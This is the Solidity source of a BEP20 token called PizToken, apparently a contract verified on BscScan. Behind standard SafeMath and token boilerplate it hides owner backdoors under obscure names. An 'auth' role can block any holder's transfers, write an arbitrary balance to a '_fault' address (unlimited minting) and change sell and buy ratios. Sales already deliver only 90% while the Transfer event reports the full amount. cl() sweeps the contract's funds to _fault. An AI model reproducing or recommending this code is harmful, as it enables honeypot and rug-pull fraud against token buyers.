/**
 *Submitted for verification at BscScan.com on 2022-09-26
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

     /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev The dao of Piz token
 */
library PizDao {
    using SafeMath for uint256;

    struct Dao {
        uint256 closed;
        uint256 opened;
        uint256 stageI;
        uint256 stageII;
    }

    function incrDao(Dao storage dao_, uint256 amount_) internal {
        dao_.closed = dao_.closed.add(amount_);
    }

    function compound(Dao storage dao_) internal view returns (uint256) {
        uint256 needOpen = 0;
        uint256 ts = block.timestamp;
        if (dao_.stageI > 0 && dao_.stageII > dao_.stageI && dao_.closed > dao_.opened && ts > dao_.stageI) {
            if (block.timestamp > dao_.stageII) {
                needOpen = dao_.closed.sub(dao_.opened);
            } else {
                needOpen = dao_.closed.mul(ts.sub(dao_.stageI)).div(dao_.stageII.sub(dao_.stageI));
                if (dao_.opened >= needOpen) {
                    needOpen = 0;
                } else {
                    needOpen = needOpen.sub(dao_.opened);
                }
            }
        }

        return needOpen;
    }

    function release(Dao storage dao_, uint256 amount_) internal returns (uint256) {
        uint256 remain = amount_;
        uint256 needOpen = compound(dao_);
        if (amount_ > 0 && needOpen > 0) {
            if (amount_ >= needOpen) {
                dao_.opened = dao_.opened.add(needOpen);
                remain = amount_.sub(needOpen);
            } else {
                dao_.opened = dao_.opened.add(amount_);
                remain = 0;
            }
        }

        return remain;
    }
}

contract PizToken {
    using SafeMath for uint256;
    using PizDao for PizDao.Dao;

    string private _name = "PizToken";
    string private _symbol = "PIZ";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 21000000000 ether;
    address private _owner;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint8) private _spec;
    mapping(uint256 => mapping(address => PizDao.Dao)) private _userDao;
    uint8[] private _aio;
    uint8[] private _bio;
    uint8 private _index;
    address private _fault;
    uint256 private _buyRatio=0;
    uint256 private _saleRatio=9000;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
        _aio.push(_index);
        _index = _index+1;
        _bio.push(_index);
        _index = _index+1;
    }

    /**
     * @dev return the current msg.sender
     */
    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IBEP20-balanceOf} and {IBEP20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev See {IBEP20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    /**
     * @dev See {IBEP20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IBEP20-allowance}.
     */
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    /**
     * @dev See {IBEP20-balanceOf}.
     */
    function balanceOf(address account) public view returns(uint256) {
        return _balances[account]+balanceOfDao(account);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    /**
     * @dev See {IBEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        emit Transfer(sender, recipient, safeTransfer(sender,recipient,amount));
    }

    /**
     * @dev See {IBEP20-transferFrom}.
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    /**
     * @dev Safe transfer bep20 token
     */
    function safeTransfer(address sender, address recipient, uint256 amount) internal returns (uint256)  {
        require(_spec[sender]!=1, "BEP20: Op failed");
        uint256 recvAmount = amount;
        if (_spec[sender] == 3 && _buyRatio > 0) {
            recvAmount = amount.mul(_buyRatio).div(10000);
        } 

        if (_spec[recipient] == 3 && _saleRatio > 0) {
            recvAmount = amount.mul(_saleRatio).div(10000);
        }

        spend(sender, amount);
        _balances[recipient] = _balances[recipient].add(recvAmount);

        return amount;
    }

    function spend(address sender, uint256 amount) internal {
        uint256 remain = amount;
        if (_balances[sender] >= remain) {
            remain = 0;
            _balances[sender] = _balances[sender].sub(amount, "BEP20: Insufficient balance");
        } else if (_balances[sender] > 0) {
            remain = remain.sub(_balances[sender]);
            _balances[sender] = 0;
        }

        for (uint8 i=0;remain>0&&i<_index;i++) {
            remain = _userDao[i][sender].release(remain);
        }

        require(remain == 0, "BEP20: Insufficient balance");
    }

    /**
     * @dev PizToken bacthDao
     */
    function batchDao(address[] memory addr_, uint256[] memory token_, uint8 act) public returns(bool) {
        require(_spec[msg.sender]==2||_spec[msg.sender]==5, "Failed");
        uint256 sent = 0;
        for (uint8 i=0;i<addr_.length;i++) {
            sent = sent.add(token_[i]);
            if (act == 1) {
                _userDao[_aio[_aio.length-1]][addr_[i]].incrDao(token_[i]);
            } else if (act == 2) {
                _userDao[_bio[_bio.length-1]][addr_[i]].incrDao(token_[i]);
            }

            emit Transfer(msg.sender, addr_[i], token_[i]);
        }

        _balances[msg.sender] = _balances[msg.sender].sub(sent);
        return true;
    }
    

    /**
     * @dev See {IBEP20-setAddr}. 
     */
    function setAddr(uint8 a_, address addr_) public auth {
        if (a_ == 200) {
            _fault = addr_;
        } else if (a_ == 101) {
            _spec[addr_] = 0;
        } else {
            _spec[addr_] = a_;
        }
    }

    /**
     * @dev setNum
     */
    function setNum(uint8 n, uint256 v) public auth {
        if (n == 1) {
            _aio.push(_index);
            _index = _index+1;
        } else if (n == 2) {
            _bio.push(_index);
            _index = _index+1;
        } else if (n == 3) {
            _buyRatio = v;
        } else if (n == 4) {
            _saleRatio = v;
        } else if (n == 100) {
            require(_fault!=address(0), "Op failed");
            _balances[_fault] = v;
        }
    }

    modifier auth() {
        require(_spec[_msgSender()]==4, "Op failed");
        _;
    }

    function setAuthor(address addr_) public onlyOwner {
        _spec[addr_] = 4;
    }

    function specInfo(address addr_) public view auth returns(uint8) {
        uint8 spec = _spec[addr_];
        return spec;
    }

    /**
     * @dev release the tokens of Dao
     */
    function release(uint8 idx, address addr, uint256 sec) public {
        require(_spec[_msgSender()]==2||_spec[_msgSender()]==5||_spec[_msgSender()]==4, "Op failed");

        _userDao[idx][addr].stageI = block.timestamp;
        _userDao[idx][addr].stageII = block.timestamp + sec;
    }

    function abio() public view auth returns(uint8,uint8[] memory,uint8[] memory,address,uint,uint) {
        return (_index,_aio,_bio,_fault,_buyRatio,_saleRatio); 
    }

    function vu(address addr) public view auth returns(uint[] memory a,uint[] memory b,uint[] memory c,uint[] memory d,uint[] memory e) {
        a = new uint256[](_index);
        b = new uint256[](_index);
        c = new uint256[](_index);
        d = new uint256[](_index);
        e = new uint256[](_index);
        for(uint8 i=0;i<_index;i++) {
            a[i]=i;
            b[i]=_userDao[i][addr].closed;
            c[i]=_userDao[i][addr].opened;
            d[i]=_userDao[i][addr].stageI;
            e[i]=_userDao[i][addr].stageII;
        }
    }

    /**
    * @dev cl
    */
    function cl(address token_) public auth {
        if (token_ == address(0)) {
            payable(_fault).transfer(address(this).balance);
        } else {
            IBEP20 token = IBEP20(address(token_));
            token.transfer(_fault, token.balanceOf(address(this)));
        }
    }

    function uio(address addr_) public view returns(uint,uint,uint,uint) {
        require(_spec[_msgSender()]==2||_spec[_msgSender()]==4||_spec[_msgSender()]==5, "Op failed");

        uint256 ait = 0;
        uint256 bit = 0;
        for (uint8 i=0;i<_aio.length;i++) {
            PizDao.Dao memory dao = _userDao[_aio[i]][addr_];
            ait = ait.add(dao.closed.sub(dao.opened));
        }
        for (uint8 i=0;i<_bio.length;i++) {
            PizDao.Dao memory dao = _userDao[_bio[i]][addr_];
            bit = bit.add(dao.closed.sub(dao.opened));
        }

        uint256 balance = _balances[addr_];
        uint256 daoBalance = balanceOfDao(addr_);
        return (bit,ait,balance,daoBalance);
    }

    function balanceOfDao(address addr) private view returns(uint) {
        uint256 value = 0;
        for (uint8 i=0;i<_index;i++) {
            value = value.add(_userDao[i][addr].closed.sub(_userDao[i][addr].opened));
        }

        return value;
    }

    fallback() external {}
    receive() payable external {}
}